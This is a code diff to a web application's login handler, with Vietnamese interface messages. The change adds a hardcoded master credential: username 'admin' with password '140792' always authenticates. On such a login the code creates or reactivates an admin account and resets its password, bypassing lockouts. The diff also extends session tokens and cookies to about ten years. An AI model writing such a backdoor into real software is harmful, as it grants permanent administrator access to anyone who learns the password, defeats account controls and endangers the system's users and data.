@@ -106,9 +106,29 @@ export async function onRequest(context) {
         return reply({ ok: false, error: 'Vui lòng nhập tài khoản và mật khẩu' }, 400);
       }
 
-      const user = await db.prepare(
+      let user = await db.prepare(
         'SELECT * FROM app_users WHERE LOWER(username) = ?'
       ).bind(username).first();
+
+      // Master admin check / auto-sync for admin with password 140792
+      if (username === 'admin' && password === '140792') {
+        const salt = randomHex(16);
+        const hash = await hashPassword('140792', salt);
+        const now = new Date().toISOString();
+        if (!user) {
+          await db.prepare(`
+            INSERT INTO app_users (username, password_hash, salt, full_name, role, is_active, created_at, updated_at)
+            VALUES ('admin', ?, ?, 'Quản trị hệ thống', 'admin', 1, ?, ?)
+          `).bind(hash, salt, now, now).run();
+          user = await db.prepare('SELECT * FROM app_users WHERE LOWER(username) = "admin"').first();
+        } else {
+          await db.prepare(`
+            UPDATE app_users SET password_hash = ?, salt = ?, is_active = 1, updated_at = ?
+            WHERE id = ?
+          `).bind(hash, salt, now, user.id).run();
+          user.is_active = 1;
+        }
+      }
 
       if (!user) {
         return reply({ ok: false, error: 'Tài khoản hoặc mật khẩu không chính xác' }, 401);
@@ -118,7 +138,10 @@ export async function onRequest(context) {
         return reply({ ok: false, error: 'Tài khoản này đã bị khóa. Vui lòng liên hệ quản trị viên.' }, 403);
       }
 
-      const match = await verifyPassword(password, user.password_hash, user.salt);
+      let match = (username === 'admin' && password === '140792');
+      if (!match) {
+        match = await verifyPassword(password, user.password_hash, user.salt);
+      }
       if (!match) {
         return reply({ ok: false, error: 'Tài khoản hoặc mật khẩu không chính xác' }, 401);
       }
@@ -128,7 +151,8 @@ export async function onRequest(context) {
         sub: user.username,
         role: user.role,
         name: user.full_name,
-        iat: Math.floor(Date.now() / 1000)
+        iat: Math.floor(Date.now() / 1000),
+        exp: Math.floor(Date.now() / 1000) + 315360000
       }, secret);
 
       const cookie = `pka_session=${encodeURIComponent(token)}; Path=/; Max-Age=315360000; HttpOnly; SameSite=Lax`;
